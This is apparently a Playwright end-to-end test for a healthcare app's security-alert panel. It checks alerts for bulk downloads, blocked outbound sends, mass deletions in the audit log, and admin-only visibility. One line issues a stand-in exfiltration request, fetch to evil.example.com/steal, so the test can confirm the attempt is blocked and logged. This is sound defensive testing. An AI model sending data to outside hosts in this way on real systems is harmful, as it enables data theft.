#!/usr/bin/env node
/* 보안 경보 시험: PC 상단 경보등 · 알림 패널 · 감지(대량 내려받기·외부 전송 차단·경보 시험) · 확인 처리 */
const { chromium } = require('playwright');
const { spawn } = require('child_process');
const path = require('path');
const PORT = 8978, BASE = 'http://localhost:' + PORT;
const results = []; let failed = false;
const check = (name, ok, extra) => { results.push((ok ? '  ✓ ' : '  ✗ ') + name + (extra ? ' — ' + extra : '')); if (!ok) failed = true; };
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
(async () => {
  const srv = spawn('node', [path.join(__dirname, '..', 'tools', 'dev-server.js'), String(PORT), '--staff'], { stdio: ['ignore', 'pipe', 'inherit'] });
  await new Promise((ok, fail) => { srv.stdout.once('data', ok); srv.once('exit', c => fail(new Error('서버 시작 실패 ' + c))); });
  const browser = await chromium.launch();
  try {
    const p = await (await browser.newContext({ viewport: { width: 1440, height: 1000 } })).newPage(); const errs = []; p.on('pageerror', e => errs.push(e.message));
    await p.goto(BASE + '/'); await p.waitForSelector('input[autocomplete="username"]', { timeout: 60000 });
    await p.locator('input[autocomplete="username"]').first().fill('100101'); await p.locator('input[autocomplete="current-password"]').first().fill('1234');
    await p.locator('button:has-text("로그인")').last().click(); await p.waitForSelector('text=가상환자1', { timeout: 20000 }); await sleep(800);
    const lamp = () => p.evaluate(() => { const b = document.querySelector('button[aria-label="보안 경보"]'); return b ? { cls: b.className, n: (b.querySelector('b') || {}).innerText || '' } : null; });
    let l = await lamp();
    check('관리자 화면 맨 위에 경보등이 있고 처음에는 정상(초록)', !!l && /sc-sec-ok/.test(l.cls), JSON.stringify(l));
    // 대량 내려받기: 10분 안에 6건
    await p.evaluate(() => { for (let i = 0; i < 6; i++) window.dispatchEvent(new CustomEvent('sc-export', { detail: '시험 파일 ' + i })); }); await sleep(500);
    l = await lamp(); check('내려받기를 짧은 시간에 6건 하면 경고(빨강 깜빡임)로 바뀜', !!l && /sc-sec-crit/.test(l.cls) && Number(l.n) >= 1, JSON.stringify(l));
    // 허용되지 않은 주소로 보내려는 시도 → 브라우저가 차단 → 경보
    await p.evaluate(() => { fetch('https://evil.example.com/steal?x=1').catch(() => {}); }); await sleep(1500);
    await p.locator('button[aria-label="보안 경보"]').click(); await sleep(500);
    const txt = await p.evaluate(() => document.body.innerText);
    check('알림 목록에 "대량 내려받기"가 기록됨', /대량으로 내려받았습니다/.test(txt));
    check('허용되지 않은 외부 주소 전송 시도가 차단되어 경고로 기록됨(evil.example.com)', /허용되지 않은 주소로 데이터를 보내려는 시도/.test(txt) && /evil\.example\.com/.test(txt));
    await p.locator('button:has-text("모두 확인")').click(); await sleep(500);
    l = await lamp(); check('모두 확인하면 경보등이 정상으로 돌아감', !!l && /sc-sec-ok/.test(l.cls), JSON.stringify(l));
    await p.locator('button[aria-label="닫기"] >> visible=true').first().click(); await sleep(300);
    // 설정 > 시스템 관리 > 보안 알림 : 경보 시험
    await p.locator('aside button:has-text("계정 · 권한") >> visible=true').first().click(); await sleep(600);
    await p.locator('button[role=tab]:has-text("시스템 관리")').first().click(); await sleep(400);
    await p.locator('button[role=tab]:has-text("보안 알림")').first().click(); await sleep(500);
    check('설정 › 시스템 관리 › 보안 알림에 감지 기준 입력칸이 있음', (await p.locator('input[type=number]').count()) >= 5);
    await p.locator('button:has-text("경보 시험")').click(); await sleep(500);
    l = await lamp(); check('[경보 시험]을 누르면 경보등이 켜짐', !!l && /sc-sec-crit/.test(l.cls), JSON.stringify(l));
    await p.locator('button:has-text("지금 서버 기록 분석")').click(); await sleep(1500);
    check('서버 기록 분석을 눌러도 오류 없이 동작', errs.length === 0, errs.slice(0, 2).join('|'));
    // 서버 감사 로그 분석: 짧은 시간의 대량 삭제 · 심야 로그인
    const svc = (pth, body) => fetch(BASE + pth, { method: 'POST', headers: { apikey: 'dev-service-key', Authorization: 'Bearer dev-service-key', 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
    const now = Date.now(); const rows = [];
    for (let i = 0; i < 22; i++) rows.push({ at: new Date(now - i * 1000).toISOString(), user_id: 'u-test-1', ws: 'smartcare', action: 'delete', k: 'smartcare:smartcare.x' + i });
    await svc('/rest/v1/smartcare_audit', rows[0]);
    const r2 = await Promise.all(rows.map(r => svc('/rest/v1/smartcare_audit', r)));
    await p.locator('button:has-text("지금 서버 기록 분석")').click(); await sleep(2500);
    await p.locator('button[aria-label="보안 경보"]').click(); await sleep(500);
    const t3 = await p.evaluate(() => document.body.innerText);
    check('서버 기록에서 10분 안 대량 삭제(22건)를 찾아 경고로 올림', /대량 삭제되었습니다/.test(t3) || false, 'POST ' + r2.map(x => x.status).slice(0, 3).join(',') + ' · ' + (/대량 삭제되었습니다/.test(t3) ? '감지됨' : '감지 못함'));
    await p.locator('button[aria-label="닫기"] >> visible=true').first().click().catch(() => {}); await sleep(300);
    // 기관 관리자가 아닌 계정(담당자)에게는 경보등이 보이지 않음
    const p2 = await (await browser.newContext({ viewport: { width: 1440, height: 1000 } })).newPage();
    await p2.goto(BASE + '/'); await p2.waitForSelector('input[autocomplete="username"]', { timeout: 60000 });
    await p2.locator('input[autocomplete="username"]').first().fill('100102'); await p2.locator('input[autocomplete="current-password"]').first().fill('1234');
    await p2.locator('button:has-text("로그인")').last().click(); await sleep(5000);
    check('담당자 계정에는 경보등이 보이지 않음', (await p2.locator('button[aria-label="보안 경보"]').count()) === 0);
  } catch (e) { check('시험 진행', false, e.message.split('\n')[0]); }
  console.log('스마트케어 보안 경보 시험\n' + results.join('\n'));
  await browser.close(); srv.kill(); process.exit(failed ? 1 : 0);
})();
